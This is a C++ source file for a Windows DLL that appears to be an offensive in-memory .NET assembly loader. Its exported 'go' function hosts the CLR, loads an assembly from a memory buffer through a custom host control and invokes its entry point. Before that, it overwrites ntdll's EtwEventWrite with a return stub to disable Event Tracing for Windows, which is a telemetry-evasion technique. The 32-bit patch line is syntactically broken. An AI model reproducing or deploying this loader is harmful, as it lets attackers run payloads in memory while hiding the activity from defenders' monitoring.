#include "DotnetExec.hpp"

#include <cstring>
#include <array>
#include <thread>
#include <iostream>
#include <fstream>
#include <string>


#pragma comment(lib, "mscoree.lib")

using namespace mscorlib;


#include <shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")


typedef HRESULT(WINAPI *funcCLRCreateInstance)
(
	REFCLSID  clsid,
	REFIID     riid,
	LPVOID  * ppInterface
);
static const GUID xCLSID_ICLRRuntimeHost = { 0x90F1A06E, 0x7712, 0x4762, {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02} };
typedef HRESULT(__stdcall* CLRIdentityManagerProc)(REFIID, IUnknown**);


#define ERROR_INIT_CLR_1 1 
#define ERROR_INIT_CLR_2 2
#define ERROR_INIT_CLR_3 3
#define ERROR_INIT_CLR_4 4
#define ERROR_INIT_CLR_5 5
#define ERROR_INIT_CLR_6 6
#define ERROR_INIT_CLR_7 7
#define ERROR_INIT_CLR_8 8

#define ERROR_LOAD_ASSEMLBY_1 11
#define ERROR_LOAD_ASSEMLBY_2 12
#define ERROR_LOAD_ASSEMLBY_3 13
#define ERROR_LOAD_ASSEMLBY_4 14
#define ERROR_LOAD_ASSEMLBY_5 15

#define ERROR_INVOKE_METHOD_1 21
#define ERROR_INVOKE_METHOD_2 22
#define ERROR_INVOKE_METHOD_3 23
#define ERROR_INVOKE_METHOD_4 24

#define ERROR_INVOKE_METHOD_11 31
#define ERROR_INVOKE_METHOD_12 32
#define ERROR_INVOKE_METHOD_13 33
#define ERROR_INVOKE_METHOD_14 34
#define ERROR_INVOKE_METHOD_15 35


int loadAssembly_internal(void* ptr, int size, char* arg)
{

	
	//
	// Patch EtwEventWrite
	//


	void * pEventWrite = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
	
	HANDLE hProc=(HANDLE)INVALID_HANDLE_VALUE;

	DWORD oldprotect = 0;
	VirtualProtect(pEventWrite, 1024, PAGE_READWRITE, &oldprotect);
	// Sw3NtProtectVirtualMemory_(hProc, &pEventWrite, &sizeToAlloc, PAGE_READWRITE, &oldAccess);

	#ifdef _WIN64
		// memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
		char patch[] = "\x48\x33\xc0\xc3"; // xor rax, rax; ret
		int patchSize = 4;
	#else
		// memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
		char patch[] patch = "\x33\xc0\xc2\x14\x00"; // xor rax, rax; ret
		int patchSize = 5;
	#endif
	
	WriteProcessMemory(hProc, pEventWrite, (PVOID)patch, patchSize, 0);

	VirtualProtect(pEventWrite, 1024, oldprotect, &oldprotect);


	//
	// Go
	//


	std::string data((char*)ptr, size);
	std::wstring argument(reinterpret_cast<wchar_t*>(arg));

	// initCLR
	ICLRMetaHost *m_pMetaHost;
	ICLRRuntimeInfo *m_pRuntimeInfo;
	ICLRRuntimeHost *m_pClrRuntimeHost;
	MyHostControl* m_pCustomHostControl;
	ICorRuntimeHost* m_pCorHost;
	IUnknownPtr m_spAppDomainThunk;

	// loadAssembly
	mscorlib::_AppDomainPtr m_spDefaultAppDomain;
	TargetAssembly* m_targetAssembly;


	//
	// Load CLR
	//

	HMODULE hMscoree = LoadLibrary("mscoree.dll");


	funcCLRCreateInstance pCLRCreateInstance = NULL;
	pCLRCreateInstance = (funcCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");

	HRESULT hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&m_pMetaHost));
	if (FAILED(hr))
		return ERROR_INIT_CLR_1;

	hr = m_pMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&m_pRuntimeInfo));
	if (FAILED(hr))
		return ERROR_INIT_CLR_2;

	BOOL loadable;
	hr = m_pRuntimeInfo->IsLoadable(&loadable);
	if (FAILED(hr))
		return ERROR_INIT_CLR_3;

	hr = m_pRuntimeInfo->GetInterface(xCLSID_ICLRRuntimeHost, IID_PPV_ARGS(&m_pClrRuntimeHost));
	if (FAILED(hr))
		return ERROR_INIT_CLR_4;
	
	m_pCustomHostControl = new MyHostControl();
	m_pClrRuntimeHost->SetHostControl(m_pCustomHostControl);

	// start the CLR
	hr = m_pClrRuntimeHost->Start();
	if (FAILED(hr))
		return ERROR_INIT_CLR_5;

	// Now we get the ICorRuntimeHost interface so we can use the normal (deprecated) assembly load API calls
	hr = m_pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&m_pCorHost);
	if (FAILED(hr))
		return ERROR_INIT_CLR_6;

	// Get a pointer to the default AppDomain in the CLR.
	hr = m_pCorHost->GetDefaultDomain(&m_spAppDomainThunk);
	if (FAILED(hr))
		return ERROR_INIT_CLR_7;

	hr = m_spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&m_spDefaultAppDomain));
	if (FAILED(hr))
		return ERROR_INIT_CLR_8;

	m_targetAssembly = new TargetAssembly();
	m_pCustomHostControl->setTargetAssembly(m_targetAssembly);


	//
	// loadAssembly
	//


	mscorlib::_AssemblyPtr spAssembly;


	CLRIdentityManagerProc pIdentityManagerProc = NULL;
	m_pRuntimeInfo->GetProcAddress("GetCLRIdentityManager", (void**)&pIdentityManagerProc);

	ICLRAssemblyIdentityManager* pIdentityManager;
	hr = pIdentityManagerProc(IID_ICLRAssemblyIdentityManager, (IUnknown**)&pIdentityManager);
	if (FAILED(hr))
		return ERROR_LOAD_ASSEMLBY_1;
	
	m_pCustomHostControl->updateTargetAssembly(pIdentityManager, data);
	LPWSTR identityBuffer = m_pCustomHostControl->getAssemblyInfo();

	// With the modification done to the host control, we can now load the assembly with load2 as if it was on the dik
	BSTR assemblyName = SysAllocString(identityBuffer);
		hr = m_spDefaultAppDomain->Load_2(assemblyName, &spAssembly);
	if (FAILED(hr))
	{
		SysFreeString(assemblyName);
		return ERROR_LOAD_ASSEMLBY_3;
	}
	SysFreeString(assemblyName);
	pIdentityManager->Release();

	
	//
	// Exec exe
	//


	if(spAssembly==nullptr)
		return ERROR_INVOKE_METHOD_11;

	// decryptMem();
	mscorlib::_MethodInfoPtr pMethodInfo;
	hr = spAssembly->get_EntryPoint(&pMethodInfo);
	if (FAILED(hr) || pMethodInfo == NULL)
		return ERROR_INVOKE_METHOD_12;

	SAFEARRAY* sav = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	VARIANT vtPsa;

	LONG i;
	if(!argument.empty()) 
	{
		std::wstring wCommand(argument.begin(), argument.end());
		WCHAR **argv;
		int argc;
		argv = CommandLineToArgvW(wCommand.data(), &argc);
		
		vtPsa.vt = (VT_ARRAY | VT_BSTR);
		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);

		// add each string parameter
		for(i=0; i<argc; i++) 
		{  
			SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(argv[i]));
		}
	} 
	else 
	{
		vtPsa.vt = (VT_ARRAY | VT_BSTR);
		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, 1);
		
		i=0;
		SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(L""));
	}
	i=0;
	SafeArrayPutElement(sav, &i, &vtPsa);
	
	VARIANT retVal;
	ZeroMemory(&retVal, sizeof(VARIANT));
	VARIANT obj;
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt    = VT_NULL;
	obj.plVal = NULL;

	try
	{
		hr = pMethodInfo->Invoke_3(obj, sav, &retVal);

		SafeArrayDestroy(sav);
		VariantClear(&vtPsa);
		VariantClear(&retVal);
		VariantClear(&obj);
		pMethodInfo->Release();

		if (FAILED(hr))
		{
			return ERROR_INVOKE_METHOD_13;
		}
	}
	catch (_com_error &e)
	{
		SafeArrayDestroy(sav);
		VariantClear(&vtPsa);
		VariantClear(&retVal);
		VariantClear(&obj);
		pMethodInfo->Release();

		return ERROR_INVOKE_METHOD_14;
	}
	catch (...)
	{
		SafeArrayDestroy(sav);
		VariantClear(&vtPsa);
		VariantClear(&retVal);
		VariantClear(&obj);
		pMethodInfo->Release();

		return ERROR_INVOKE_METHOD_15;
	}

	return 0;
}


extern "C" __declspec(dllexport) int go(void* data, int size, char* argument);
int go(void* data, int size, char* argument) 
{
	loadAssembly_internal(data, size, argument);

	return 0;
}


// bool readFileToBuffer(const std::string& path, std::string& outData) 
// {
//     std::ifstream file(path, std::ios::binary | std::ios::ate);
//     if (!file) return false;

//     std::streamsize size = file.tellg();
//     file.seekg(0, std::ios::beg);
//     outData.resize(size);

//     return file.read(&outData[0], size).good();
// }

// int main(int argc, char* argv[]) 
// {
// 	for(int i = 0; i < argc; ++i)
// 	{
// 		std::cout << "Argument " << i << ": " << argv[i] << std::endl;
// 	}

//     if (argc < 3) 
// 	{
//         std::cerr << "Usage:\n"
//                   << "  " << argv[0] << " <exe_file_path> <argument>\n";

//         return 1;
//     }

//     std::string source = argv[1];
//     std::string argument = argv[2];
//     std::string data;


// 	std::cout << "[*] Input is a file path.\n";
// 	if (!readFileToBuffer(source, data)) 
// 	{
// 		std::cerr << "[-] Failed to read file: " << source << "\n";
// 		return 1;
// 	}
// 	std::cout << "[+] EXE file loaded (" << data.size() << " bytes)\n";

//     std::cout << "[+] Argument: " << argument << "\n";

// 	int result = loadAssembly_internal((void*)data.data(), data.size(), (char*)argument.data());
// }



BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ) 
{
	switch ( fdwReason ) {
			case DLL_PROCESS_ATTACH:
					break;
			case DLL_THREAD_ATTACH:
					break;
			case DLL_THREAD_DETACH:
					break;
			case DLL_PROCESS_DETACH:
					break;
			}
	return TRUE;
}